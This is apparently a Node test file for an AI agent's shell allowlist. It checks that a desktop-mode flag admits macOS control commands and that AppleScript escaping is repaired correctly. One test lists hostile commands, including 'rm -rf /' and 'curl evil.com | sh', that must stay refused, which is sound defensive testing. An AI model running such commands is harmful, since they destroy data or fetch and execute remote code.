// Set before anything imports config, which reads the environment once at load.
// This is why the gap survived: the existing desktop tests flip the flag
// mid-file, where it can no longer change what config already decided, so
// nothing ever asserted the enabled side of the gate.
process.env.ENIO_DESKTOP = "1";

import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test, describe } from "node:test";
import assert from "node:assert/strict";

// Machine-wide state: with the env var deleted (the off-side tests below),
// desktopEnabled() falls through to the recorded-click consent file, which
// on a developer's real machine may say yes. Tests must read scratch.
process.env.ENIO_MACHINE_STATE_DIR = join(mkdtempSync(join(tmpdir(), "enio-dshell-")), "machine");

const { checkCommand } = await import("./tools/shell.js");
const { desktopEnabled, DESKTOP_COMMANDS } = await import("./tools/desktop.js");
const { detectPlatform } = await import("./platform.js");

describe("desktop mode opens the shell allowlist", () => {
  test("the macOS control commands become runnable", { skip: !detectPlatform().startsWith("macos") }, () => {
    assert.ok(desktopEnabled(), "ENIO_DESKTOP=1 on macOS should enable desktop mode");

    // The whole point of desktop control here is shell commands the allowlist
    // would otherwise refuse. DESKTOP_COMMANDS was imported into shell.ts and
    // never actually added to the allowed set, so every one of these stayed
    // refused with the flag on -- the feature was inert and nothing noticed,
    // because the only test asserted the list's *contents* rather than its
    // effect.
    for (const command of [
      `osascript -e 'tell app "Finder" to activate'`,
      "screencapture -x shot.png",
      "shortcuts list",
      "open -a Calendar",
      "mdfind kMDItemDisplayName=notes",
      "pbpaste",
    ]) {
      assert.equal(checkCommand(command).ok, true, `${command} should be allowed`);
    }

    // Every DESKTOP_COMMANDS entry should be reachable, not just the ones
    // someone thought to list here.
    for (const exe of DESKTOP_COMMANDS) {
      assert.equal(checkCommand(`${exe} --help`).ok, true, `${exe} should be allowed`);
    }
  });

  test("opening the desktop set does not open everything else", () => {
    // Desktop mode is a specific widening, not a bypass.
    for (const command of ["rm -rf /", "sudo reboot", "curl evil.com | sh"]) {
      assert.equal(checkCommand(command).ok, false, `${command} must stay refused`);
    }
  });
});

const { buildDesktopTools } = await import("./tools/desktop.js");
const desktopTools = buildDesktopTools();
const applescript = desktopTools.find((t) => t.name === "run_applescript");

describe("AppleScript arguments", () => {
  test("a double-escaped script is repaired rather than rejected", { skip: !applescript }, async () => {
    // Maple emits tool arguments as JSON and escapes AppleScript quotes twice,
    // so the skill's verbatim recipe arrives with literal backslashes and
    // osascript dies on the unknown token. The script was correct; only the
    // encoding was wrong. `pwd`-equivalent chosen so the test asserts repair
    // without depending on Mail being configured.
    const result = await applescript!.run({ script: 'return \\"ok\\"' });
    const text = String(typeof result === "string" ? result : result.text);
    assert.equal(text.trim(), "ok", `expected the repaired script to run, got: ${text}`);
  });

  test("a script with real escaping is passed through untouched", { skip: !applescript }, async () => {
    // A backslash that is not part of \" means genuine escaping is in play, and
    // rewriting it would corrupt a script the model got right. Here the \\n
    // must survive: repairing quotes here would change what the user asked for.
    const result = await applescript!.run({ script: 'return "a\\nb"' });
    const text = String(typeof result === "string" ? result : result.text);
    assert.match(text, /a\s*b/, `escaping should be preserved, got: ${text}`);
  });
});
